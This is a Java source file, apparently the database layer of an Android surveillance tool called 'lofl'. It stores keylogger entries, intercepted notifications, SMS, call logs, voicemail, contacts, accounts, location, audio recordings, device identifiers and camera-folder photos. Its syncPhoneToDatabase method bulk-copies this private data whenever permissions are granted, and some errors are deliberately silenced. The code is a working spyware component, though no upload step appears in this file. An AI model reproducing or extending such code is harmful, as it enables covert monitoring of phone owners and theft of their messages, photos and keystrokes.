package com.candroid.lofl.data.db;

import android.Manifest;
import android.accounts.Account;
import android.content.ContentValues;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.SQLException;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.Build;
import android.util.Log;

import com.candroid.lofl.api.Apps;
import com.candroid.lofl.api.ContentProviders;
import com.candroid.lofl.api.Storage;
import com.candroid.lofl.api.Systems;
import com.candroid.lofl.api.User;
import com.candroid.lofl.data.pojos.CalendarEvent;
import com.candroid.lofl.data.pojos.Contact;
import com.candroid.lofl.data.pojos.InterceptedNotification;
import com.candroid.lofl.data.pojos.PhoneCall;
import com.candroid.lofl.data.pojos.SmsMsg;
import com.candroid.lofl.data.pojos.VoiceMail;
import com.candroid.lofl.jobs.JobsScheduler;
import com.candroid.lofl.services.CommandsIntentService;
import com.candroid.lofl.services.LoflService;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class Database {

    public static void insertVoicemails(SQLiteDatabase database, List<VoiceMail> voicemails){
        try{
            database.beginTransaction();
            for(VoiceMail voicemail : voicemails){
                ContentValues values = new ContentValues();
                values.put(DataContract.VoicemailContract.COLUMN_NUMBER, voicemail.number);
                values.put(DataContract.VoicemailContract.COLUMN_DATE, voicemail.date);
                values.put(DataContract.VoicemailContract.COLUMN_DURATION, voicemail.duration);
                values.put(DataContract.VoicemailContract.COLUMN_NEW, voicemail.isNew);
                values.put(DataContract.VoicemailContract.COLUMN_READ, voicemail.hasRead);
                database.insert(DataContract.VoicemailContract.TABLE_NAME, null, values);
            }
            database.setTransactionSuccessful();
        }catch (SQLException e){
            e.printStackTrace();
        }finally {
            database.endTransaction();
        }
    }

    public static void insertAccounts(SQLiteDatabase database, Account[] accounts){
        long newRowId = -1;
        try{
            database.beginTransaction();
            for(Account account : accounts){
                ContentValues values = new ContentValues();
                values.put(DataContract.AccountsContract.COLUMN_NAME, account.name);
                values.put(DataContract.AccountsContract.COLUMN_TYPE, account.type);
                newRowId = database.insert(DataContract.AccountsContract.TABLE_NAME, null, values);
            }
            database.setTransactionSuccessful();
        }catch (Exception e){
            e.printStackTrace();
        }finally{
            database.endTransaction();
        }
    }

    public static void insertNotification(SQLiteDatabase database, InterceptedNotification notification){
        long newRowId = -1;
        try{
            database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DataContract.NotificationContract.COLUMN_TITLE, notification.title);
            values.put(DataContract.NotificationContract.COLUMN_BODY, notification.body);
            values.put(DataContract.NotificationContract.COLUMN_FOOTER, notification.footer);
            values.put(DataContract.NotificationContract.COLUMN_APP, notification.app);
            values.put(DataContract.NotificationContract.COLUMN_TIME, notification.time);
            newRowId = database.insert(DataContract.NotificationContract.TABLE_NAME, null, values);
            database.setTransactionSuccessful();
        }catch (SQLException e){
            //die silent
        }finally {
            database.endTransaction();
        }
    }


    public static void insertKeyLogEntry(SQLiteDatabase database, String text, long date, String event){
        long newRowId = -1;
        try{
            database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DataContract.KeyloggerContract.COLUMN_TEXT, text);
            values.put(DataContract.KeyloggerContract.COLUMN_DATE, date);
            values.put(DataContract.KeyloggerContract.COLUMN_EVENT, event);
            newRowId = database.insert(DataContract.KeyloggerContract.TABLE_NAME, null, values);
            database.setTransactionSuccessful();
        }catch (SQLException e){
            //die silent
        }finally {
            database.endTransaction();
        }
    }

    public static void insertPhoneCalls(SQLiteDatabase database, List<PhoneCall> phoneCalls){
        for(PhoneCall phoneCall : phoneCalls){
            try{
                database.beginTransaction();
                ContentValues values = new ContentValues();
                values.put(DataContract.CallLogContract.COLUMN_TYPE, phoneCall.mType);
                values.put(DataContract.CallLogContract.COLUMN_ADDRESS, phoneCall.mAddress);
                values.put(DataContract.CallLogContract.COLUMN_TIME, phoneCall.mDate);
                values.put(DataContract.CallLogContract.COLUMN_DURATION, phoneCall.mDuration);
                database.insertWithOnConflict(DataContract.CallLogContract.TABLE_NAME, null,values, SQLiteDatabase.CONFLICT_IGNORE);
                database.setTransactionSuccessful();
            }catch (SQLException e){
                e.printStackTrace();
            }finally {
                database.endTransaction();
            }
        }
    }

    public static void insertCalendarEvents(SQLiteDatabase database, List<CalendarEvent> calendarEvents){
        for(CalendarEvent calendarEvent : calendarEvents){
            try{
                database.beginTransaction();
                ContentValues values = new ContentValues();
                values.put(DataContract.CalendarEventContract.COLUMN_EMAIL_ACCOUNT, calendarEvent.mAccountName);
                values.put(DataContract.CalendarEventContract.COLUMN_TITLE, calendarEvent.mTitle);
                values.put(DataContract.CalendarEventContract.COLUMN_DESCRIPTION, calendarEvent.mDescription);
                values.put(DataContract.CalendarEventContract.COLUMN_START_TIME, calendarEvent.mstartDate);
                values.put(DataContract.CalendarEventContract.COLUMN_END_TIME, calendarEvent.mEndDate);
                values.put(DataContract.CalendarEventContract.COLUMN_DURATION, calendarEvent.mDuration);
                values.put(DataContract.CalendarEventContract.COLUMN_TIMEZONE, calendarEvent.mTimeZone);
                values.put(DataContract.CalendarEventContract.COLUMN_LOCATION, calendarEvent.mLocation);
                values.put(DataContract.CalendarEventContract.COLUMN_ORGANIZER, calendarEvent.mOrganizer);
                database.insertWithOnConflict(DataContract.CalendarEventContract.TABLE_NAME, null, values, SQLiteDatabase.CONFLICT_IGNORE);
                database.setTransactionSuccessful();
            }catch (SQLException e){
                e.printStackTrace();
            }finally{
                database.endTransaction();
            }
        }
    }

    public static void insertContacts(SQLiteDatabase database, List<Contact> contacts){
        for(Contact contact : contacts){
            try{
                database.beginTransaction();
                ContentValues values = new ContentValues();
                values.put(DataContract.ContactsContract.COLUMN_NAME, contact.mName);
                values.put(DataContract.ContactsContract.COLUMN_ADDRESS, contact.mAddress);
                values.put(DataContract.ContactsContract.COLUMN_EMAIL, contact.mEmail);
                database.insertWithOnConflict(DataContract.ContactsContract.TABLE_NAME, null, values, SQLiteDatabase.CONFLICT_IGNORE);
                database.setTransactionSuccessful();
            }catch (SQLException e){
                e.printStackTrace();
            }finally{
                database.endTransaction();
            }
        }
    }

    public static void insertDevice(SQLiteDatabase database, String address, String ip, String manufacturer, String product, String version, String flavor, String serial, String radio){
        long newRowId = -1;
        try{
            database.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DataContract.DeviceContract.COLUMN_ADDRESS, address);
            values.put(DataContract.DeviceContract.COLUMN_IP, ip);
            values.put(DataContract.DeviceContract.COLUMN_MANUFACTURER, manufacturer);
            values.put(DataContract.DeviceContract.COLUMN_PRODUCT, product);
            values.put(DataContract.DeviceContract.COLUMN_VERSION, version);
            values.put(DataContract.DeviceContract.COLUMN_FLAVOR, flavor);
            values.put(DataContract.DeviceContract.COLUMN_SERIAL, serial);
            values.put(DataContract.DeviceContract.COLUMN_RADIO, radio);
            newRowId = database.insert(DataContract.DeviceContract.TABLE_NAME, null, values);
            database.setTransactionSuccessful();
        }catch (SQLException e){
            e.printStackTrace();
        }finally {
            database.endTransaction();
        }
        if(newRowId > -1){
            Log.d("DATABASE", "We inserted a new device into our device database table");
        }
    }

    public static void insertPackages(SQLiteDatabase db, List<ApplicationInfo> apps){
        for(ApplicationInfo app : apps){
            try{
                db.beginTransaction();
                ContentValues values = new ContentValues();
                values.put(DataContract.PackagesContract.COLUMN_PACKAGE_NAME, app.packageName);
                long newRowId = db.insertWithOnConflict(DataContract.PackagesContract.TABLE_NAME, null, values, SQLiteDatabase.CONFLICT_IGNORE);
                Log.d("Database", "inserted new package name into row id = " + newRowId);
                db.setTransactionSuccessful();
            }catch (Exception e){
                e.printStackTrace();
            }finally {
                db.endTransaction();
            }
        }
    }

    public static void insertSmsMessages(SQLiteDatabase database, List<SmsMsg> smsMsgs){
        for(SmsMsg smsMsg : smsMsgs) {
            try {
                database.beginTransaction();
                ContentValues values = new ContentValues();
                if (smsMsg.mType == 1) {
                    values.put(DataContract.SmsContract.COLUMN_DESTINATION_ADDRESS, LoflService.sTelephoneAddress);
                    values.put(DataContract.SmsContract.COLUMN_ORIGIN_ADDRESS, smsMsg.mAddress);
                } else if (smsMsg.mType == 2){
                    values.put(DataContract.SmsContract.COLUMN_DESTINATION_ADDRESS, smsMsg.mAddress);
                    values.put(DataContract.SmsContract.COLUMN_ORIGIN_ADDRESS, LoflService.sTelephoneAddress);
                }
                values.put(DataContract.SmsContract.COLUMN_BODY, smsMsg.mBody);
                values.put(DataContract.SmsContract.COLUMN_TYPE, smsMsg.mType);
                values.put(DataContract.SmsContract.COLUMN_TIME, smsMsg.mDate);
                database.insert(DataContract.SmsContract.TABLE_NAME, null, values);
                database.setTransactionSuccessful();
            } catch (SQLException e) {
                e.printStackTrace();
            } finally {
                database.endTransaction();
            }
        }
    }

    protected static long insertAudioFile(Context context, DatabaseHelper database, long time, File audioFile){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            byte[] file = Storage.Files.fileToBytes(audioFile);
            ContentValues values = new ContentValues();
            values.put(DataContract.AudioRecordingsContract.COLUMN_TIME, time);
            values.put(DataContract.AudioRecordingsContract.COLUMN_AUDIO_FILES, file);
            newRowId = db.insert(DataContract.AudioRecordingsContract.TABLE_NAME, null, values);
        }catch (Exception e){
            e.printStackTrace();
        }
        db.close();
        return newRowId;
    }

    public static long insertMedia(SQLiteDatabase db, String name, File mediaFile) {
        long newRowId = -1;
        int type = -1;
        boolean isImage = Storage.Files.isImage(mediaFile);
        boolean isVideo = Storage.Files.isVideo(mediaFile);
        boolean isText = Storage.Files.isText(mediaFile);
        boolean isExcel = Storage.Files.isSpreadsheet(mediaFile);
        if (isImage) {
            type = DataContract.MediaContract.TYPE_IMAGE;
        } else if (isVideo) {
            type = DataContract.MediaContract.TYPE_VIDEO;
        } else if (isText) {
            type = DataContract.MediaContract.TYPE_TEXT;
        } else if (isExcel) {
            type = DataContract.MediaContract.TYPE_SPREADSHEET;
        } else {
            type = 0;
        }
        try {
            db.beginTransaction();
            byte[] file = Storage.Files.fileToBytes(mediaFile);
            ContentValues values = new ContentValues();
            values.put(DataContract.MediaContract.COLUMN_TITLE, name);
            values.put(DataContract.MediaContract.COLUMN_FILE, file);
            values.put(DataContract.MediaContract.COLUMN_TYPE, type);
            newRowId = db.insertWithOnConflict(DataContract.MediaContract.TABLE_NAME, null, values, SQLiteDatabase.CONFLICT_IGNORE);
            db.setTransactionSuccessful();
        } catch (Exception e) {
            e.printStackTrace();
        }finally {
            db.endTransaction();
        }
        return newRowId;
    }

    public static long insertCalendarEvent(Context context, DatabaseHelper database, String email, String title, String description, long startTime, long endTime, int isAllDay, String duration, String timeZone, String location, String organizer){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            ContentValues values = new ContentValues();
            values.put(DataContract.CalendarEventContract.COLUMN_EMAIL_ACCOUNT, email);
            values.put(DataContract.CalendarEventContract.COLUMN_TITLE, title);
            values.put(DataContract.CalendarEventContract.COLUMN_DESCRIPTION, description);
            values.put(DataContract.CalendarEventContract.COLUMN_START_TIME, startTime);
            values.put(DataContract.CalendarEventContract.COLUMN_END_TIME, endTime);
            values.put(DataContract.CalendarEventContract.COLUMN_IS_ALL_DAY, isAllDay);
            values.put(DataContract.CalendarEventContract.COLUMN_DURATION, duration);
            values.put(DataContract.CalendarEventContract.COLUMN_TIMEZONE, timeZone);
            values.put(DataContract.CalendarEventContract.COLUMN_LOCATION, location);
            values.put(DataContract.CalendarEventContract.COLUMN_ORGANIZER, organizer);
            newRowId = db.insert(DataContract.CalendarEventContract.TABLE_NAME, null, values);
        }catch (Exception e){
            e.printStackTrace();
        }
        db.close();
        return newRowId;
    }

    public static long insertMessage(DatabaseHelper database, String destinationAddress, String originAddress, String body, long time, int type){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            db.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DataContract.SmsContract.COLUMN_DESTINATION_ADDRESS, destinationAddress);
            values.put(DataContract.SmsContract.COLUMN_ORIGIN_ADDRESS, originAddress);
            values.put(DataContract.SmsContract.COLUMN_BODY, body);
            values.put(DataContract.SmsContract.COLUMN_TIME, time);
            values.put(DataContract.SmsContract.COLUMN_TYPE, type);
            newRowId = db.insert(DataContract.SmsContract.TABLE_NAME, null, values);
            db.setTransactionSuccessful();
        }catch (SQLException e){
            e.printStackTrace();
        }finally {
            if (db != null && db.isOpen()){
                db.endTransaction();
                db.close();
            }
        }
        return newRowId;
    }

    public static long insertCallLogEntry(DatabaseHelper database, String type, String address, String duration, String time){
        SQLiteDatabase db = database.getWritableDatabase();
        long newRowId = -1;
        try{
            db.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DataContract.CallLogContract.COLUMN_TYPE, type);
            values.put(DataContract.CallLogContract.COLUMN_ADDRESS, address);
            values.put(DataContract.CallLogContract.COLUMN_DURATION, duration);
            values.put(DataContract.CallLogContract.COLUMN_TIME, time);
            newRowId = db.insert(DataContract.CallLogContract.TABLE_NAME, null, values);
            db.setTransactionSuccessful();
        }catch (SQLException e){
            e.printStackTrace();
        }finally{
            db.endTransaction();
            db.close();
        }
        return newRowId;
    }

    public static void insertLocation(DatabaseHelper database, double latitude, double longitude){
        SQLiteDatabase db = database.getWritableDatabase();
        try{
            db.beginTransaction();
            ContentValues values = new ContentValues();
            values.put(DataContract.LocationData.COLUMN_LATITUDE, latitude);
            values.put(DataContract.LocationData.COLUMN_LONGITUDE, longitude);
            long newRowId = db.insert(DataContract.LocationData.TABLE_NAME, null, values);
            db.setTransactionSuccessful();
        }catch (SQLException e){
            e.printStackTrace();
        }finally{
            db.endTransaction();
            db.close();
        }
    }

    public static void syncPhoneToDatabase(Context context){
        SQLiteDatabase database = DatabaseHelper.getInstance(context).getWritableDatabase();
        try {
            database.beginTransaction();
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                ArrayList<Contact> contacts = ContentProviders.Contacts.fetchContactsInformation(context);
                try {
                    database.beginTransaction();
                    Database.insertContacts(database, contacts);
                    database.setTransactionSuccessful();
                } catch (SQLiteException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    JobsScheduler.setJobRan(context, JobsScheduler.CONTACTS_KEY);
                }
            }
            //SYNC INSTALLED APPS
            try {
                database.beginTransaction();
                Database.insertPackages(database, Apps.getInstalledApps(context));
                database.setTransactionSuccessful();
            } catch (SQLiteException e) {
                e.printStackTrace();
            } finally {
                database.endTransaction();
                JobsScheduler.setJobRan(context, JobsScheduler.PACKAGES_KEY);
            }
            //DCIM SYNC
            if (context.checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                File[] pictures = Storage.Files.getFilesForDirectory(Storage.Files.getDcimDirectory().getPath() + "/Camera");
                try {
                    database.beginTransaction();
                    if (pictures != null && pictures.length > 0) {
                        for (File f : pictures) {
                            Database.insertMedia(database, f.getName(), f);
                        }
                    }
                    database.setTransactionSuccessful();
                } catch (SQLiteException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    JobsScheduler.setJobRan(context, JobsScheduler.DCIM_KEY);
                }
            }
            //SYNC CALL LOG
            if (context.checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                ArrayList<PhoneCall> phoneCalls = ContentProviders.CallLog.fetchCallLog(context);
                try {
                    database.beginTransaction();
                    Database.insertPhoneCalls(database, phoneCalls);
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    JobsScheduler.setJobRan(context, JobsScheduler.PHONE_CALLS_KEY);
                }
            }
            //SYNC CALENDAR EVENTS
            if (context.checkSelfPermission(Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED) {
                ArrayList<CalendarEvent> calendarEvents = ContentProviders.Calendars.fetchCalendarEvents(context);
                try {
                    database.beginTransaction();
                    Database.insertCalendarEvents(database, calendarEvents);
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    JobsScheduler.setJobRan(context, JobsScheduler.CALENDAR_EVENTS_KEY);
                }
            }
            //SYNC SMS
            if (context.checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                ArrayList<SmsMsg> smsMsgs = ContentProviders.Sms.fetchSmsMessages(context);
                try {
                    database.beginTransaction();
                    Database.insertSmsMessages(database, smsMsgs);
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                    JobsScheduler.setJobRan(context, JobsScheduler.SMS_KEY);
                }
            }
            //SYNC DEVICE INFO
            try {
                database.beginTransaction();
                String ip = Systems.Networking.fetchIpv4Addresses().get(0);
                Database.insertDevice(database, LoflService.sTelephoneAddress, ip, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, null, Build.SERIAL, Build.RADIO);
                // TODO: 2/10/19 unable to access BuildConfig from library....must find a way to get this from app
                //Database.insertDevice(database, LoflService.sTelephoneAddress, Build.MANUFACTURER, Build.PRODUCT, Build.VERSION.SDK, BuildConfig.FLAVOR, Build.SERIAL, Build.RADIO);
                database.setTransactionSuccessful();
            } catch (SQLException e) {
                e.printStackTrace();
            } finally {
                database.endTransaction();
                JobsScheduler.setJobRan(context, JobsScheduler.DEVICE_KEY);
            }
            //SYNC ACCOUNTS
            //GET_ACCOUNTS permission falls under READ_CONTACTS permission's scope as of 6.0
            if(context.checkSelfPermission(Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED) {
                try {
                    database.beginTransaction();
                    Database.insertAccounts(database, User.getAccounts(context));
                    database.setTransactionSuccessful();
                } catch (SQLException e) {
                    e.printStackTrace();
                } finally {
                    database.endTransaction();
                }
            }
            //SYNC VOICEMAIL
            if(context.checkSelfPermission(Manifest.permission.READ_VOICEMAIL) == PackageManager.PERMISSION_GRANTED){
                try{
                    database.beginTransaction();
                    insertVoicemails(database, ContentProviders.Voicemail.fetchVoicemail(context));
                    database.setTransactionSuccessful();
                }catch (SQLException e){
                    e.printStackTrace();
                }finally {
                    database.endTransaction();
                }
            }
            database.setTransactionSuccessful();
        } catch (SQLException e) {
            e.printStackTrace();
        } finally {
            //FNISHED SYNCING PHONE TO DATABASE
            database.endTransaction();
            try{
                database.close();
            }catch (IllegalStateException e){
                e.printStackTrace();
            }
        }
    }

/*    protected static String getMessages(Context context, String phraseToLookFor, DatabaseHelper database){
        StringBuilder messages = new StringBuilder();
        SQLiteDatabase db = database.getReadableDatabase();
        String[] projection = new String[]{DataContract._ID, DataContract.COLUMN_DESTINATION_ADDRESS, DataContract.COLUMN_ORIGIN_ADDRESS};
        String selection = DataContract.COLUMN_DESTINATION_ADDRESS + " = ?";
        String[] selectionArgs = new String[]{phraseToLookFor};
        String sortOrder = DataContract.COLUMN_DESTINATION_ADDRESS + " DESC";
        Cursor cursor = db.query(DataContract.TABLE_NAME, projection, selection, selectionArgs, null, null, sortOrder);
        int addressColumn = cursor.getColumnIndexOrThrow(DataContract.COLUMN_DESTINATION_ADDRESS);
        int bodyColumn = cursor.getColumnIndexOrThrow(DataContract.COLUMN_ORIGIN_ADDRESS);
        while(cursor.moveToNext()){
            messages.append(cursor.getString(addressColumn));
            messages.append(" - ");
            messages.append(cursor.getString(bodyColumn));
            messages.append(Constants.NEW_LINE);
        }
        cursor.close();
        db.close();
        return messages.toString();
    }

    protected static int deleteMessages(Context context, DatabaseHelper database, String phraseToLookFor){
        SQLiteDatabase db = database.getWritableDatabase();
        String selection = DataContract.COLUMN_DESTINATION_ADDRESS + " LIKE ?";
        String[] selectionArgs = new String[]{phraseToLookFor};
        int numberOfRowsDeleted = db.delete(DataContract.TABLE_NAME, selection, selectionArgs);
        db.close();
        return numberOfRowsDeleted;
    }*/

}